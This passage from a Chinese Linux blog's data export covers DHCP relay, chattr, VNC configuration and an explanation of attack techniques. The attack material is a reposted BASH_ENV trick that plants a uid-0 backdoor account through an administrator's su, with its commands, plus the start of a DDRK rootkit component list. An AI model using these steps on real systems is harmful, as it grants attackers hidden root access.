Source global definitions<br />if [ -f &#x2F;etc&#x2F;bashrc ]; then<br />. &#x2F;etc&#x2F;bashrc<br />fi<br /><br />———————————————————————————————————————————-<br />———————————————————————————————————————————-<br />每当执行bash脚本，就会调用。默认是&#x3D;&gt;bash_profile。它在调用别的脚本。<br /><br />$BASH_ENV变量定义后，直接掉过常规。<br />&#x2F;tmp目录默认谁都可以写的，谁都可以调用。在httpd提权时，可以上传文件到这，可惜没有拿下。<br /><br />export定义环境变量，启动一个shell后会改变。<br /><br />只用su进去之后，环境变量没有改变。所以调用BASH时，创建用户。<br /><br />$:su - root&amp;#160; &#x2F;&#x2F;可以预防，改变环境变量到root。 <br /><br /><br /><br /><br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>转载一编提权文章做解释：<br /><p>一个linux提权用的技巧，放出来攒RP了。<br />OK，通常情况下，我们在执行bash脚本的时候，有一个执行过程，其中有一点比较重要:如果BASH_ENV被设置的话，它就会执行BASH_ENV指向的脚本<br />一个test:<br />以下是引用片段：<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />[xiaoyu@localdomain ~]$ export BASH_ENV&#x3D;&quot;&#x2F;tmp&#x2F;.bashrc&quot;<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />&#x2F;tmp&#x2F;.bashrc<br />[xiaoyu@localdomain ~]$ cat &#x2F;tmp&#x2F;.bashrc<br />#!&#x2F;bin&#x2F;bash<br />echo &quot;Hello&quot;<br />[xiaoyu@localdomain ~]$ ls -l<br />-rwxrwxr-x 1 xiaoyu xiaoyu 22 2008-09-11 05:54 test.sh</p><p>[xiaoyu@localdomain ~]$ cat test.sh<br />#!&#x2F;bin&#x2F;bash<br />echo &quot;kk&quot;<br />[xiaoyu@localdomain ~]$ .&#x2F;test.sh<br />Hello<br />kk</p><p>恩，很好，和我们预期的一样。看看我们怎么利用。</p><p>grep su ~&#x2F;.bash_history<br />显示此用户有使用su登录root账户的特殊癖好。以前我们遇到这种情况通常就是塞个fakesu.c进去。然后修改.bash_profile，建立个别 名之类的东西。通过getpass来获得root密码，记录，然后去除别名…..关键是管理员使用正确密码登录的时候也是会提示一次密码错误。遇到傻 点的管理员可能就放过这个细节了，再输入一遍密码就OK了。但是某些非人类admin会以最快的速度检查系统被入侵的迹象，外加啥啥啥，而且这种管理员改  root密码几乎是肯定的了。所以偷取下来的密码也没啥用处。恩，聪明的X客们一定知道我要做什么了。呵呵，先看看环境变量su后在不<br />以下是引用片段：<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />&#x2F;tmp&#x2F;.bashrc<br />[xiaoyu@localdomain ~]$ su<br />Password:<br />[root@localdomain xiaoyu]# echo $BASH_ENV<br />&#x2F;tmp&#x2F;.bashrc</p><p>OK，实验结束，实战：<br />以下是引用片段：<br />[xiaoyu@localdomain tmp]$ echo ’&#x2F;usr&#x2F;sbin&#x2F;useradd -u 0 -o kk 2&gt; &#x2F;dev&#x2F;null’ &gt; &#x2F;tmp&#x2F;.bashrc<br />[xiaoyu@localdomain tmp]$ cat &#x2F;tmp&#x2F;.bashrc<br />&#x2F;usr&#x2F;sbin&#x2F;useradd -u 0 -o kk 2&gt; &#x2F;dev&#x2F;null<br />[xiaoyu@localdomain tmp]$ grep kk &#x2F;etc&#x2F;passwd<br />[xiaoyu@localdomain tmp]$ echo $BASH_ENV<br />&#x2F;tmp&#x2F;.bashrc<br />[xiaoyu@localdomain tmp]$ su<br />Password:<br />[root@localdomain tmp]# cd &#x2F;home&#x2F;xiaoyu</p><br /><br />解释。<br />.bash_profile 文件内容<br /><br /># .bash_profile<br /><br /># Get the aliases and functions<br />if [ -f ~&#x2F;.bashrc ]; then<br />. ~&#x2F;.bashrc<br />fi<br /><br /># User specific environment and startup programs<br /><br />PATH&#x3D;$PATH:$HOME&#x2F;bin<br /><br />export PATH<br />unset USERNAME<br /><br />———————————————————————————————————————————-<br />———————————————————————————————————————————-<br />.bashrc文件<br /># .bashrc<br /><br /># User specific aliases and functions<br /><br />alias rm&#x3D;’rm -i’<br />alias cp&#x3D;’cp -i’<br />alias mv&#x3D;’mv -i’<br /><br /># Source global definitions<br />if [ -f &#x2F;etc&#x2F;bashrc ]; then<br />. &#x2F;etc&#x2F;bashrc<br />fi<br /><br />———————————————————————————————————————————-<br />———————————————————————————————————————————-<br />每当执行bash脚本，就会调用。默认是&#x3D;&gt;bash_profile。它在调用别的脚本。<br /><br />$BASH_ENV变量定义后，直接掉过常规。<br />&#x2F;tmp目录默认谁都可以写的，谁都可以调用。在httpd提权时，可以上传文件到这，可惜没有拿下。<br /><br />export定义环境变量，启动一个shell后会改变。<br /><br />只用su进去之后，环境变量没有改变。所以调用BASH时，创建用户。<br /><br />$:su - root&amp;#160; &#x2F;&#x2F;可以预防，改变环境变量到root。 <br /><br /><br /><br /><br /></p>\n"},{"title":"linux下dhcp中继、","date":"2010-05-28T02:08:00.000Z","_content":"DHCP的中继。<br />为何不能跨网段。。<br />我们都知道，在LAN中动态分配IP需要DHCP。但是DHCP的所有信息都是以广播的形式传送的，所以无法通过路由器，这就决定了一台DHCP服务<br /><br />器只能对本网段的客户机分配IP地址，如果要用一台DHCP服务器给不同的网段分配IP，需要在此网段设置一台DHCP中继代理。安装了Linux系<br /><br />统的机器经过设置是可以作为DHCP中继代理的，我们作个实验来看一下设置方法。<br /><br />实验平台:3台安装了LINUX系统的服务器,一台为DHCP服务器Server,一台为router，做路由功能。一台做dhcprelay中继代理relay,二台用于测<br /><br />试的PC1和PC2。<br /><br />实验环境:分配三个网段:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <br /><br />192.168.1.0/24<br />192.168.2.0/24<br /><br />作为route的服务器需要安装二个网卡，分别为:eth0;eth1。<br /><br />IP分配如下：<br /><br />eth0:192.168.1.254<br />eth1:192.168.2.254<br /><br />DHCP服务器Server1只需一张网卡，为:eth0<br /><br />eth0:192.168.1.1 网关指向：192.168.1.254<br /><br />要求用于测试的PC1,PC2,分别挂在二个网段中,最后实验的结果为,二个PC均获得所在网段的ip地址<br /><br />对DHCP服务器的配置:<br /><br />#vi /etc/dhcpd.conf<br /><br />引用:<br /><br />ddns-update-style interim;<br /><br />ignore client-updates;<br /><br />option subnet-mask&#160;&#160; 255.255.255.0;<br /><br />option domain-name&#160;&#160; “domain.org”;<br /><br /><br />default-lease-time 259200;<br /><br />max-lease-time 777600;<br /><br />option domain-name-servers 202.96.134.133,202.96.128.68;<br /><br />subnet 192.168.1.0 netmask 255.255.255.0 <br />{<br />option routers 192.168.10.1;<br />range dynamic-bootp 192.168.10.1 192.168.10.254;<br />}<br /><br />subnet 192.168.2.0 netmask 255.255.255.0&#160;&#160;&#160; //192.168.2.0/24<br />{ <br />option routers 192.168.20.1;<br />range dynamic-bootp 192.168.20.1 192.168.20.254;<br />}<br /><br />最后,我们使用下面的命令启动DHCP服务器:#service dhcpd start<br />有的人说起不来服务，不知道什么原因。没有遇到过、、<br /><br />DHCP服务器配置成功。<br /><br /><br /><br />下面我们将配置中LINUX为路由器，<br />#echo “1”&gt; /proc/sys/net/ipv4/ip_forward<br />配置linux有转发功能、<br />默认开机就变为0了。可以修改文件/etc/sysctl.conf。<br /><br /><br />下面配置dhccrealy<br /><br />首先要配置文件/etc/sysconfig/dhcrealy <br /><br />#vi /etc/sysconfig/dhcrealy<br />在里面输入:<br /><br />INTERFACES=”eth0″<br />DHCPSERVERS-”192.168.1.1″ #指向DHCP服务器<br /><br />下面启动dhcrelay<br />用pc1,pc2进行测试，查看结果.<br /><br /><br />备注：<br /><br />在虚拟做实验时，网卡设定虚拟网络如下：<br /><br />Server1的网卡eth0指向VMnet1 <br /><br />Server2的网卡eth0指向VMnet1，eth1指向VMnet2<br /><br />PC1的网卡指向VMnet1<br /><br />PC2的网卡指向VMnet2<br /><br />","source":"_posts/linux下dhcp中继、.md","raw":"title: linux下dhcp中继、\ncategories: [Linux]\ntags: []\ndate: 2010-05-28 10:08:00\n---\nDHCP的中继。<br />为何不能跨网段。。<br />我们都知道，在LAN中动态分配IP需要DHCP。但是DHCP的所有信息都是以广播的形式传送的，所以无法通过路由器，这就决定了一台DHCP服务<br /><br />器只能对本网段的客户机分配IP地址，如果要用一台DHCP服务器给不同的网段分配IP，需要在此网段设置一台DHCP中继代理。安装了Linux系<br /><br />统的机器经过设置是可以作为DHCP中继代理的，我们作个实验来看一下设置方法。<br /><br />实验平台:3台安装了LINUX系统的服务器,一台为DHCP服务器Server,一台为router，做路由功能。一台做dhcprelay中继代理relay,二台用于测<br /><br />试的PC1和PC2。<br /><br />实验环境:分配三个网段:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <br /><br />192.168.1.0/24<br />192.168.2.0/24<br /><br />作为route的服务器需要安装二个网卡，分别为:eth0;eth1。<br /><br />IP分配如下：<br /><br />eth0:192.168.1.254<br />eth1:192.168.2.254<br /><br />DHCP服务器Server1只需一张网卡，为:eth0<br /><br />eth0:192.168.1.1 网关指向：192.168.1.254<br /><br />要求用于测试的PC1,PC2,分别挂在二个网段中,最后实验的结果为,二个PC均获得所在网段的ip地址<br /><br />对DHCP服务器的配置:<br /><br />#vi /etc/dhcpd.conf<br /><br />引用:<br /><br />ddns-update-style interim;<br /><br />ignore client-updates;<br /><br />option subnet-mask&#160;&#160; 255.255.255.0;<br /><br />option domain-name&#160;&#160; “domain.org”;<br /><br /><br />default-lease-time 259200;<br /><br />max-lease-time 777600;<br /><br />option domain-name-servers 202.96.134.133,202.96.128.68;<br /><br />subnet 192.168.1.0 netmask 255.255.255.0 <br />{<br />option routers 192.168.10.1;<br />range dynamic-bootp 192.168.10.1 192.168.10.254;<br />}<br /><br />subnet 192.168.2.0 netmask 255.255.255.0&#160;&#160;&#160; //192.168.2.0/24<br />{ <br />option routers 192.168.20.1;<br />range dynamic-bootp 192.168.20.1 192.168.20.254;<br />}<br /><br />最后,我们使用下面的命令启动DHCP服务器:#service dhcpd start<br />有的人说起不来服务，不知道什么原因。没有遇到过、、<br /><br />DHCP服务器配置成功。<br /><br /><br /><br />下面我们将配置中LINUX为路由器，<br />#echo “1”&gt; /proc/sys/net/ipv4/ip_forward<br />配置linux有转发功能、<br />默认开机就变为0了。可以修改文件/etc/sysctl.conf。<br /><br /><br />下面配置dhccrealy<br /><br />首先要配置文件/etc/sysconfig/dhcrealy <br /><br />#vi /etc/sysconfig/dhcrealy<br />在里面输入:<br /><br />INTERFACES=”eth0″<br />DHCPSERVERS-”192.168.1.1″ #指向DHCP服务器<br /><br />下面启动dhcrelay<br />用pc1,pc2进行测试，查看结果.<br /><br /><br />备注：<br /><br />在虚拟做实验时，网卡设定虚拟网络如下：<br /><br />Server1的网卡eth0指向VMnet1 <br /><br />Server2的网卡eth0指向VMnet1，eth1指向VMnet2<br /><br />PC1的网卡指向VMnet1<br /><br />PC2的网卡指向VMnet2<br /><br />","slug":"linux下dhcp中继、","published":1,"updated":"2023-04-22T05:38:44.815Z","_id":"clgrjlxh8003t7opice72d2wv","comments":1,"layout":"post","photos":[],"link":"","content":"<p>DHCP的中继。<br />为何不能跨网段。。<br />我们都知道，在LAN中动态分配IP需要DHCP。但是DHCP的所有信息都是以广播的形式传送的，所以无法通过路由器，这就决定了一台DHCP服务<br /><br />器只能对本网段的客户机分配IP地址，如果要用一台DHCP服务器给不同的网段分配IP，需要在此网段设置一台DHCP中继代理。安装了Linux系<br /><br />统的机器经过设置是可以作为DHCP中继代理的，我们作个实验来看一下设置方法。<br /><br />实验平台:3台安装了LINUX系统的服务器,一台为DHCP服务器Server,一台为router，做路由功能。一台做dhcprelay中继代理relay,二台用于测<br /><br />试的PC1和PC2。<br /><br />实验环境:分配三个网段:&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; <br /><br />192.168.1.0&#x2F;24<br />192.168.2.0&#x2F;24<br /><br />作为route的服务器需要安装二个网卡，分别为:eth0;eth1。<br /><br />IP分配如下：<br /><br />eth0:192.168.1.254<br />eth1:192.168.2.254<br /><br />DHCP服务器Server1只需一张网卡，为:eth0<br /><br />eth0:192.168.1.1 网关指向：192.168.1.254<br /><br />要求用于测试的PC1,PC2,分别挂在二个网段中,最后实验的结果为,二个PC均获得所在网段的ip地址<br /><br />对DHCP服务器的配置:<br /><br />#vi &#x2F;etc&#x2F;dhcpd.conf<br /><br />引用:<br /><br />ddns-update-style interim;<br /><br />ignore client-updates;<br /><br />option subnet-mask&amp;#160;&amp;#160; 255.255.255.0;<br /><br />option domain-name&amp;#160;&amp;#160; “domain.org”;<br /><br /><br />default-lease-time 259200;<br /><br />max-lease-time 777600;<br /><br />option domain-name-servers 202.96.134.133,202.96.128.68;<br /><br />subnet 192.168.1.0 netmask 255.255.255.0 <br />{<br />option routers 192.168.10.1;<br />range dynamic-bootp 192.168.10.1 192.168.10.254;<br />}<br /><br />subnet 192.168.2.0 netmask 255.255.255.0&amp;#160;&amp;#160;&amp;#160; &#x2F;&#x2F;192.168.2.0&#x2F;24<br />{ <br />option routers 192.168.20.1;<br />range dynamic-bootp 192.168.20.1 192.168.20.254;<br />}<br /><br />最后,我们使用下面的命令启动DHCP服务器:#service dhcpd start<br />有的人说起不来服务，不知道什么原因。没有遇到过、、<br /><br />DHCP服务器配置成功。<br /><br /><br /><br />下面我们将配置中LINUX为路由器，<br />#echo “1”&gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward<br />配置linux有转发功能、<br />默认开机就变为0了。可以修改文件&#x2F;etc&#x2F;sysctl.conf。<br /><br /><br />下面配置dhccrealy<br /><br />首先要配置文件&#x2F;etc&#x2F;sysconfig&#x2F;dhcrealy <br /><br />#vi &#x2F;etc&#x2F;sysconfig&#x2F;dhcrealy<br />在里面输入:<br /><br />INTERFACES&#x3D;”eth0″<br />DHCPSERVERS-”192.168.1.1″ #指向DHCP服务器<br /><br />下面启动dhcrelay<br />用pc1,pc2进行测试，查看结果.<br /><br /><br />备注：<br /><br />在虚拟做实验时，网卡设定虚拟网络如下：<br /><br />Server1的网卡eth0指向VMnet1 <br /><br />Server2的网卡eth0指向VMnet1，eth1指向VMnet2<br /><br />PC1的网卡指向VMnet1<br /><br />PC2的网卡指向VMnet2<br /><br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>DHCP的中继。<br />为何不能跨网段。。<br />我们都知道，在LAN中动态分配IP需要DHCP。但是DHCP的所有信息都是以广播的形式传送的，所以无法通过路由器，这就决定了一台DHCP服务<br /><br />器只能对本网段的客户机分配IP地址，如果要用一台DHCP服务器给不同的网段分配IP，需要在此网段设置一台DHCP中继代理。安装了Linux系<br /><br />统的机器经过设置是可以作为DHCP中继代理的，我们作个实验来看一下设置方法。<br /><br />实验平台:3台安装了LINUX系统的服务器,一台为DHCP服务器Server,一台为router，做路由功能。一台做dhcprelay中继代理relay,二台用于测<br /><br />试的PC1和PC2。<br /><br />实验环境:分配三个网段:&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; <br /><br />192.168.1.0&#x2F;24<br />192.168.2.0&#x2F;24<br /><br />作为route的服务器需要安装二个网卡，分别为:eth0;eth1。<br /><br />IP分配如下：<br /><br />eth0:192.168.1.254<br />eth1:192.168.2.254<br /><br />DHCP服务器Server1只需一张网卡，为:eth0<br /><br />eth0:192.168.1.1 网关指向：192.168.1.254<br /><br />要求用于测试的PC1,PC2,分别挂在二个网段中,最后实验的结果为,二个PC均获得所在网段的ip地址<br /><br />对DHCP服务器的配置:<br /><br />#vi &#x2F;etc&#x2F;dhcpd.conf<br /><br />引用:<br /><br />ddns-update-style interim;<br /><br />ignore client-updates;<br /><br />option subnet-mask&amp;#160;&amp;#160; 255.255.255.0;<br /><br />option domain-name&amp;#160;&amp;#160; “domain.org”;<br /><br /><br />default-lease-time 259200;<br /><br />max-lease-time 777600;<br /><br />option domain-name-servers 202.96.134.133,202.96.128.68;<br /><br />subnet 192.168.1.0 netmask 255.255.255.0 <br />{<br />option routers 192.168.10.1;<br />range dynamic-bootp 192.168.10.1 192.168.10.254;<br />}<br /><br />subnet 192.168.2.0 netmask 255.255.255.0&amp;#160;&amp;#160;&amp;#160; &#x2F;&#x2F;192.168.2.0&#x2F;24<br />{ <br />option routers 192.168.20.1;<br />range dynamic-bootp 192.168.20.1 192.168.20.254;<br />}<br /><br />最后,我们使用下面的命令启动DHCP服务器:#service dhcpd start<br />有的人说起不来服务，不知道什么原因。没有遇到过、、<br /><br />DHCP服务器配置成功。<br /><br /><br /><br />下面我们将配置中LINUX为路由器，<br />#echo “1”&gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward<br />配置linux有转发功能、<br />默认开机就变为0了。可以修改文件&#x2F;etc&#x2F;sysctl.conf。<br /><br /><br />下面配置dhccrealy<br /><br />首先要配置文件&#x2F;etc&#x2F;sysconfig&#x2F;dhcrealy <br /><br />#vi &#x2F;etc&#x2F;sysconfig&#x2F;dhcrealy<br />在里面输入:<br /><br />INTERFACES&#x3D;”eth0″<br />DHCPSERVERS-”192.168.1.1″ #指向DHCP服务器<br /><br />下面启动dhcrelay<br />用pc1,pc2进行测试，查看结果.<br /><br /><br />备注：<br /><br />在虚拟做实验时，网卡设定虚拟网络如下：<br /><br />Server1的网卡eth0指向VMnet1 <br /><br />Server2的网卡eth0指向VMnet1，eth1指向VMnet2<br /><br />PC1的网卡指向VMnet1<br /><br />PC2的网卡指向VMnet2<br /><br /></p>\n"},{"title":"linux 文件、目录写保护","date":"2011-06-15T02:55:00.000Z","_content":"<p>文件：</p><p>[root@book ~]# touch a.txt</p>[root@book ~]# chattr +i a.txt<br />[root@root&nbsp;~]# rm -f a.txt<br />rm: cannot remove `a.txt': Operation not permitted<br />[root@book ~]# ls<br />anaconda-ks.cfg a.txt Desktop &nbsp;install.log install.log.syslog<br />[root@book ~]# chattr -i a.txt<br />[root@book ~]# rm -f a.txt<br />[root@book ~]# ls<br />anaconda-ks.cfg Desktop &nbsp;install.log install.log.syslog<br /><p>&nbsp;</p><p>目录：</p>[root@root&nbsp;root]# mkdir test<br />[root@root&nbsp;root]# chattr +i test<br /><p>[root@root&nbsp;root]# rm -fr test</p><p>rm: cannot remove directory `test': Operation not permitted</p><p>&nbsp;</p><p></p>","source":"_posts/linux-文件、目录写保护.md","raw":"title: linux 文件、目录写保护\ncategories: [Linux]\ntags: []\ndate: 2011-06-15 10:55:00\n---\n<p>文件：</p><p>[root@book ~]# touch a.txt</p>[root@book ~]# chattr +i a.txt<br />[root@root&nbsp;~]# rm -f a.txt<br />rm: cannot remove `a.txt': Operation not permitted<br />[root@book ~]# ls<br />anaconda-ks.cfg a.txt Desktop &nbsp;install.log install.log.syslog<br />[root@book ~]# chattr -i a.txt<br />[root@book ~]# rm -f a.txt<br />[root@book ~]# ls<br />anaconda-ks.cfg Desktop &nbsp;install.log install.log.syslog<br /><p>&nbsp;</p><p>目录：</p>[root@root&nbsp;root]# mkdir test<br />[root@root&nbsp;root]# chattr +i test<br /><p>[root@root&nbsp;root]# rm -fr test</p><p>rm: cannot remove directory `test': Operation not permitted</p><p>&nbsp;</p><p></p>","slug":"linux-文件、目录写保护","published":1,"updated":"2023-04-22T05:38:44.804Z","_id":"clgrjlxha003w7opi8crl5lap","comments":1,"layout":"post","photos":[],"link":"","content":"<p>文件：</p><p>[root@book ~]# touch a.txt</p>[root@book ~]# chattr +i a.txt<br />[root@root&nbsp;~]# rm -f a.txt<br />rm: cannot remove `a.txt': Operation not permitted<br />[root@book ~]# ls<br />anaconda-ks.cfg a.txt Desktop &nbsp;install.log install.log.syslog<br />[root@book ~]# chattr -i a.txt<br />[root@book ~]# rm -f a.txt<br />[root@book ~]# ls<br />anaconda-ks.cfg Desktop &nbsp;install.log install.log.syslog<br /><p>&nbsp;</p><p>目录：</p>[root@root&nbsp;root]# mkdir test<br />[root@root&nbsp;root]# chattr +i test<br /><p>[root@root&nbsp;root]# rm -fr test</p><p>rm: cannot remove directory `test': Operation not permitted</p><p>&nbsp;</p><p></p>","site":{"data":{}},"excerpt":"","more":"<p>文件：</p><p>[root@book ~]# touch a.txt</p>[root@book ~]# chattr +i a.txt<br />[root@root&nbsp;~]# rm -f a.txt<br />rm: cannot remove `a.txt': Operation not permitted<br />[root@book ~]# ls<br />anaconda-ks.cfg a.txt Desktop &nbsp;install.log install.log.syslog<br />[root@book ~]# chattr -i a.txt<br />[root@book ~]# rm -f a.txt<br />[root@book ~]# ls<br />anaconda-ks.cfg Desktop &nbsp;install.log install.log.syslog<br /><p>&nbsp;</p><p>目录：</p>[root@root&nbsp;root]# mkdir test<br />[root@root&nbsp;root]# chattr +i test<br /><p>[root@root&nbsp;root]# rm -fr test</p><p>rm: cannot remove directory `test': Operation not permitted</p><p>&nbsp;</p><p></p>"},{"title":"liunx下VNCserver 桌面配置。。","date":"2010-05-30T07:12:00.000Z","_content":"先说我是RHEL5。内核为2.6的、<br /><br />$HOME/.vnc/xstartup<br />========== Start of xstartup ===========<br />#!/bin/sh<br /><br /># Uncomment the following two lines for normal desktop:<br />unset SESSION_MANAGER<br />exec /etc/X11/xinit/xinitrc<br /><br />[ -x /etc/vnc/xstartup ] &amp;&amp; exec /etc/vnc/xstartup<br />[ -r $HOME/.Xresources ] &amp;&amp; xrdb $HOME/.Xresources<br />xsetroot -solid grey<br />vncconfig -iconic &amp;<br />xterm -geometry 80x24+10+10 -ls -title &quot;$VNCDESKTOP d<a href=\"http://www.linuxquestions.org/questions/#\" target=\"undefined\" rel=\"noopener noreferrer\"></a>esktop&quot; &amp;<br />tw &amp;<br />========== End of xstartup =============<br /><br />/etc/sysconfig<br />=========== bottom part of vncservers (top is all comments ==<br /># VNCSERVERS=&quot;2:myusername&quot;<br /># VNCSERVERARGS[2]=&quot;-geometry 800x600 -nolisten tcp -nohttpd -localhost&quot;<br />VNCSERRVERS=&quot;1:toreilly&quot;<br />VNCSERVERARGS[1]=&quot;-geometry 800x600&quot;<br />=========== end of vncservers ===============================<br />","source":"_posts/liunx下VNCserver-桌面配置。。.md","raw":"title: liunx下VNCserver 桌面配置。。\ncategories: [Linux]\ntags: []\ndate: 2010-05-30 15:12:00\n---\n先说我是RHEL5。内核为2.6的、<br /><br />$HOME/.vnc/xstartup<br />========== Start of xstartup ===========<br />#!/bin/sh<br /><br /># Uncomment the following two lines for normal desktop:<br />unset SESSION_MANAGER<br />exec /etc/X11/xinit/xinitrc<br /><br />[ -x /etc/vnc/xstartup ] &amp;&amp; exec /etc/vnc/xstartup<br />[ -r $HOME/.Xresources ] &amp;&amp; xrdb $HOME/.Xresources<br />xsetroot -solid grey<br />vncconfig -iconic &amp;<br />xterm -geometry 80x24+10+10 -ls -title &quot;$VNCDESKTOP d<a href=\"http://www.linuxquestions.org/questions/#\" target=\"undefined\" rel=\"noopener noreferrer\"></a>esktop&quot; &amp;<br />tw &amp;<br />========== End of xstartup =============<br /><br />/etc/sysconfig<br />=========== bottom part of vncservers (top is all comments ==<br /># VNCSERVERS=&quot;2:myusername&quot;<br /># VNCSERVERARGS[2]=&quot;-geometry 800x600 -nolisten tcp -nohttpd -localhost&quot;<br />VNCSERRVERS=&quot;1:toreilly&quot;<br />VNCSERVERARGS[1]=&quot;-geometry 800x600&quot;<br />=========== end of vncservers ===============================<br />","slug":"liunx下VNCserver-桌面配置。。","published":1,"updated":"2023-04-22T05:38:44.824Z","_id":"clgrjlxht00467opi0d8p3h5w","comments":1,"layout":"post","photos":[],"link":"","content":"<p>先说我是RHEL5。内核为2.6的、<br /><br />$HOME&#x2F;.vnc&#x2F;xstartup<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Start of xstartup &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />#!&#x2F;bin&#x2F;sh<br /><br /># Uncomment the following two lines for normal desktop:<br />unset SESSION_MANAGER<br />exec &#x2F;etc&#x2F;X11&#x2F;xinit&#x2F;xinitrc<br /><br />[ -x &#x2F;etc&#x2F;vnc&#x2F;xstartup ] &amp;&amp; exec &#x2F;etc&#x2F;vnc&#x2F;xstartup<br />[ -r $HOME&#x2F;.Xresources ] &amp;&amp; xrdb $HOME&#x2F;.Xresources<br />xsetroot -solid grey<br />vncconfig -iconic &amp;<br />xterm -geometry 80x24+10+10 -ls -title &quot;$VNCDESKTOP d<a href=\"http://www.linuxquestions.org/questions/#\" target=\"undefined\" rel=\"noopener noreferrer\"></a>esktop&quot; &amp;<br />tw &amp;<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; End of xstartup &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br /><br />&#x2F;etc&#x2F;sysconfig<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; bottom part of vncservers (top is all comments &#x3D;&#x3D;<br /># VNCSERVERS&#x3D;&quot;2:myusername&quot;<br /># VNCSERVERARGS[2]&#x3D;&quot;-geometry 800x600 -nolisten tcp -nohttpd -localhost&quot;<br />VNCSERRVERS&#x3D;&quot;1:toreilly&quot;<br />VNCSERVERARGS[1]&#x3D;&quot;-geometry 800x600&quot;<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; end of vncservers &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>先说我是RHEL5。内核为2.6的、<br /><br />$HOME&#x2F;.vnc&#x2F;xstartup<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Start of xstartup &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />#!&#x2F;bin&#x2F;sh<br /><br /># Uncomment the following two lines for normal desktop:<br />unset SESSION_MANAGER<br />exec &#x2F;etc&#x2F;X11&#x2F;xinit&#x2F;xinitrc<br /><br />[ -x &#x2F;etc&#x2F;vnc&#x2F;xstartup ] &amp;&amp; exec &#x2F;etc&#x2F;vnc&#x2F;xstartup<br />[ -r $HOME&#x2F;.Xresources ] &amp;&amp; xrdb $HOME&#x2F;.Xresources<br />xsetroot -solid grey<br />vncconfig -iconic &amp;<br />xterm -geometry 80x24+10+10 -ls -title &quot;$VNCDESKTOP d<a href=\"http://www.linuxquestions.org/questions/#\" target=\"undefined\" rel=\"noopener noreferrer\"></a>esktop&quot; &amp;<br />tw &amp;<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; End of xstartup &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br /><br />&#x2F;etc&#x2F;sysconfig<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; bottom part of vncservers (top is all comments &#x3D;&#x3D;<br /># VNCSERVERS&#x3D;&quot;2:myusername&quot;<br /># VNCSERVERARGS[2]&#x3D;&quot;-geometry 800x600 -nolisten tcp -nohttpd -localhost&quot;<br />VNCSERRVERS&#x3D;&quot;1:toreilly&quot;<br />VNCSERVERARGS[1]&#x3D;&quot;-geometry 800x600&quot;<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; end of vncservers &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br /></p>\n"},{"title":"Linux下rootkit-ddrk攻击获得root权限以及清除方法[转]","date":"2011-06-27T03:10:00.000Z","_content":"<p></p><p></p><p></p><p>DDRK是一个Linux结合shv和adore-ng优点，内核级别的rootkit。</p><p>DDRK中包含的文件：</p><p>netstat &nbsp;#替换系统中的netstat，从ssh配置文件中读取端口并隐藏</p><p>rk.ko &nbsp;#内核模块，实现文件和进程的隐藏功能</p><p>setup &nbsp;#rootkit安装文件</p><p>tty &nbsp;#ava工具</p><p>bin.tgz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---ttymon</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---sshd.tgz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---.sh</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shdcf2 &nbsp;#sshd配置文件</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 